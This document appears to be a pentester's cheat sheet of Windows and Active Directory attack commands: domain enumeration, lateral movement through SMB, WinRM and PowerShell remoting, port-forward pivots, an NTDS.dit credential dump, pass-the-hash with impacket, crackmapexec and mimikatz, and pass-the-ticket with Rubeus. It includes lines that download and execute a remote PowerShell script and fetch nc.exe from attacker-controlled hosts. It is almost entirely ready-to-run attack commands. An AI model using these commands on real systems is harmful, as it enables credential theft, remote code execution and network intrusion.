### DNSCMD

```bash
dnscmd . /EnumZones
#list all dns ip
dnscmd . /EnumRecords domains .
```

### Domain info

```bash
nltest /domain_trusts
ADExplorer.exe -snapshot "" result.dat /accepteula
```

### Lateral Move

```bash
impacket-smbexec -hashes :d9d0830b1276614d3bfaad1206be6788 Administrator@127.0.0.1  


netsh interface portproxy add v4tov4 listenport=45985 connectaddress=10.240.76.111 connectport=5985
netsh interface portproxy add v4tov4 listenport=31139 connectaddress=10.240.76.111 connectport=139
netsh interface portproxy add v4tov4 listenport=31445 connectaddress=10.240.76.111 connectport=445

netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=41445

socat TCP4-LISTEN:445,reuseaddr,fork TCP4:172.28.10.17:41445
```

WinRM

```powershell
#get winrm config info
winrm enumerate winrm/config/listener
winrm enumerate winrm/config/client
#connect to host use winrm
winrs -r:http://10.0.83.30:5985 -u:administrator -p:123456 ipconfig
winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:http://10.0.83.30:5985 -u:administrator -p:123456
```

### Powershell Remoting

```powershell
$secpasswd = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('WS02\USER', $secpasswd)

$Session = New-PSSession -ComputerName FileServer -Credential $cred
Enter-PSSession $Session 


Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred

#another way
$sess = new-pssession  -ComputerName $remoteserver -Credential (get-credential -UserName "administrator" -Message "PS Remote")
$ip = Invoke-Command $sess -ScriptBlock { Get-NetIPAddress }
```

```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```

### Hash Dump

```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp\adtemp' q q"
```

### Pass-The-Hash

```bash
crackmapexec <ip> -u <user> -H "<lm>" -x "<msfvenom psh-cmd>"

impacket-wmiexec <user>@<ip> -hashes <lm:nt>

pth-winexe -U <user>%<ntlm> //<ip> "<msfvenom psh-cmd>"

python wmiexec.py -hashes :<hash> <user>@<ip>

xfreerdp /u:<user> /d:<domain> /pth:<ntlm> /v:<ip>:3389 /dynamic-resolution

sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
```

### Pass-The-Ticket

```powershell
#Check my Blog Post Kerberos Attacks in Depth for Further Information

Rebeus monitor /interval:30 

Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets

Reubus will now give you a Kerberos ticket in base64 which you can pass with

Rubeus.exe ptt /ticket:[base64blobhere]

We can now request TGS service tickets to access network resources as this user
```
